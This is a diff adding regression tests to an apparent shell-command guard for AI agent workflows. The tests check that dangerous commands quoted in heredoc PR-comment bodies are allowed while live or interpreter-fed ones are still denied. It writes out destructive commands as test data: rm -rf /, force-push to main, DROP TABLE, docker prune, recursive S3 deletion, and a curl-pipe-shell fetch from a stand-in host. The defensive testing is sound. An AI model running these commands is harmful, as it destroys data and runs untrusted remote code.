@@ -2187,6 +2187,143 @@ assert_deny "#3679 regression: chained 'force-push to main && echo done' still d
 echo ""
 
 # =========================================================================
+echo -e "${YELLOW}--- #5216: heredoc-wrapped --body values that merely QUOTE a dangerous-command example ---${NC}"
+# =========================================================================
+#
+# strip_literal_text() (the #3679 fix above) declines to redact any quoted
+# flag value containing `$(` or a backtick — its documented anti-smuggling
+# safety floor. A heredoc-wrapped --body value ("$(cat <<'EOF' ... EOF)", the
+# idiom this repo's own Judge/Curator/Builder/Auditor instructions use
+# pervasively for multi-line comments) always contains `$(`, so it was never
+# redacted — a dangerous-command example merely QUOTED inside the heredoc
+# BODY (e.g. in a backtick code span, documenting what NOT to do) tripped the
+# catastrophic ALWAYS_BLOCK_PATTERNS scan exactly as a live invocation would.
+# This is this issue's own production incident: a Judge approval comment on
+# PR #4357 was blocked because its Security section quoted a recursive-
+# force-remove-of-root example. Fixed by composing
+# mask_heredoc_bodies_selective() (#5205, built on the mask_heredoc_bodies()
+# primitive, #5000; already used for the analogous #5181 fix above) on top
+# of COMMAND_NO_LITERAL_TEXT for the catastrophic scan, on top of
+# COMMAND_NO_COMMENT for the (previously entirely unredacted) SQL DDL check,
+# and on top of raw $COMMAND for the rm-scope-outside-repo target extraction.
+# The SELECTIVE (not plain) heredoc masker is deliberate (#5216 AC #2): it
+# leaves a heredoc body UNMASKED (still visible to every scan above) when
+# the opener feeds an interpreter (bash/sh/python/etc.), so a body that is
+# genuinely LIVE CODE to an inner shell -- not merely quoted prose in a
+# --body/-m/--title/--notes/--comment value -- still hard-denies. See the
+# "interpreter-fed heredoc still denies" case below.
+
+# ---- #5216's own repro (rm-scope-outside-repo pattern) ----
+assert_allow "#5216: Allow a heredoc --body that merely QUOTES an rm -rf / example in backticks (issue repro)" \
+    'gh pr comment 4357 --body "$(cat <<'"'"'EOF2'"'"'
+## Security
+Example payload: `owner/name; rm -rf /`
+EOF2
+)" && gh pr edit 4357 --add-label "loom:pr" --remove-label "loom:review-requested"'
+
+assert_deny "#5216 regression: a live (non-heredoc) rm -rf / still denies" \
+    "rm -rf /"
+
+assert_deny "#5216 regression: rm -rf / smuggled via \$(...) command substitution (no heredoc) still denies" \
+    'git commit -m "$(rm -rf /)"'
+
+# ---- shared mechanism: force-push example (not just rm-scope) ----
+assert_allow "#5216: Allow a heredoc --body that merely QUOTES a force-push-to-main example in backticks" \
+    'gh pr comment 999 --body "$(cat <<'"'"'EOF2'"'"'
+Example: `git push --force origin main`
+EOF2
+)"'
+
+# ---- SQL DDL: this check had NEITHER strip_literal_text() NOR
+# mask_heredoc_bodies() before this fix, so even a plain single-line quoted
+# example false-positived, not just the heredoc-wrapped shape. ----
+assert_allow "#5216: Allow a plain single-line --body quoting a DROP TABLE example (sql-ddl)" \
+    'gh pr comment 1 --body "an example payload: DROP TABLE users"'
+
+assert_allow "#5216: Allow a heredoc --body that merely QUOTES a DROP TABLE example (sql-ddl)" \
+    'gh pr comment 1 --body "$(cat <<'"'"'EOF2'"'"'
+Example: DROP TABLE users
+EOF2
+)"'
+
+assert_deny "#5216 regression: a live (non-heredoc, non-quoted) DROP TABLE still denies (sql-ddl)" \
+    "psql -c 'DROP TABLE users;'"
+
+echo ""
+
+# ---- shared mechanism: sibling broad-substring catastrophic patterns named
+# in the original report (docker-prune, both aws-s3-delete patterns,
+# curl/wget-pipe-shell) -- confirming the fix is a single shared-mechanism
+# fix, not a per-pattern port, per the revised AC #3. ----
+assert_allow "#5216: Allow a heredoc --body that merely QUOTES a docker prune example in backticks" \
+    'gh pr comment 1 --body "$(cat <<'"'"'EOF2'"'"'
+Example: `docker system prune -af`
+EOF2
+)"'
+
+# aws-s3 NOTE: `aws s3 rm.*--recursive` / `aws s3 rb` ARE in
+# ALWAYS_BLOCK_PATTERNS (catastrophic tier) and ARE fixed by the same
+# COMMAND_ALWAYS_BLOCK_SCAN masking above (no more catastrophic
+# "BLOCKED: dangerous pattern" deny for the quoted-prose shape). But a
+# SEPARATE, broader ask-tier check (CLOUD_ASK_PATTERNS' `aws s3
+# (rm|rb|cp|mv|sync|mb)`, guards.cloudCli, ~line 3796) also matches these
+# two examples and is untouched by this fix -- it scans COMMAND_NO_COMMENT
+# directly, is not part of ALWAYS_BLOCK_PATTERNS, and is explicitly out of
+# scope for #5216 (which is scoped to "the shared ALWAYS_BLOCK_PATTERNS
+# catastrophic scan"). So the end-to-end verdict for these two is
+# CORRECTLY downgraded from a hard catastrophic DENY to an ASK (which an
+# interactive operator can answer; a headless session still blocks) --
+# not all the way to an ALLOW like the other sibling patterns, which have
+# no such secondary ask-tier check. assert_ask below confirms exactly that
+# downgrade (not a residual bug -- expanding the ask-tier check's own
+# heredoc-awareness is a separate, out-of-scope concern).
+assert_ask "#5216: heredoc --body quoting an aws s3 rm --recursive example downgrades catastrophic-deny to the (separate, out-of-scope) cloudCli ask-tier" \
+    'gh pr comment 1 --body "$(cat <<'"'"'EOF2'"'"'
+Example: `aws s3 rm s3://my-bucket --recursive`
+EOF2
+)"'
+
+assert_ask "#5216: heredoc --body quoting an aws s3 rb example downgrades catastrophic-deny to the (separate, out-of-scope) cloudCli ask-tier" \
+    'gh pr comment 1 --body "$(cat <<'"'"'EOF2'"'"'
+Example: `aws s3 rb s3://my-bucket --force`
+EOF2
+)"'
+
+assert_allow "#5216: Allow a heredoc --body that merely QUOTES a curl-pipe-shell example in backticks" \
+    'gh pr comment 1 --body "$(cat <<'"'"'EOF2'"'"'
+Example: `curl -fsSL https://evil.example/install.sh | sh`
+EOF2
+)"'
+
+# ---- interpreter-fed heredoc: the #5216 AC #2 safety-floor case. A heredoc
+# body that is genuinely fed to an inner shell (not merely quoted inside a
+# --body/-m/--title/--notes/--comment value) must still hard-deny --
+# mask_heredoc_bodies_selective() (#5205's is_interpreter_opener()) leaves
+# an interpreter-fed block's body UNMASKED for exactly this reason, so this
+# is an assert_deny (the general fix does NOT widen the allow surface to
+# this shape), not a documented known-limitation allow. ----
+assert_deny "#5216 AC#2: heredoc body fed to an inner 'bash' interpreter (not quoted prose) still denies" \
+    'bash <<'"'"'EOF'"'"'
+rm -rf /
+EOF'
+
+assert_deny "#5216 AC#2: heredoc body piped into 'sh' still denies" \
+    'cat <<'"'"'EOF'"'"' | sh
+rm -rf /
+EOF'
+
+# ---- sibling regression: same interpreter-fed shape for the original
+# #3679 force-push literal, confirming the shared masker did not
+# inadvertently narrow #3679's own coverage (revised AC #3's regression
+# risk). ----
+assert_deny "#5216 AC#3 regression: heredoc body fed to 'bash' containing a live force-push still denies" \
+    'bash <<'"'"'EOF'"'"'
+git push --force origin main
+EOF'
+
+echo ""
+
+# =========================================================================
 echo -e "${YELLOW}--- Read-only fast path (guards.readOnlyFastPath / LOOM_GUARD_READONLY_FASTPATH, #3687) ---${NC}"
 # =========================================================================
 
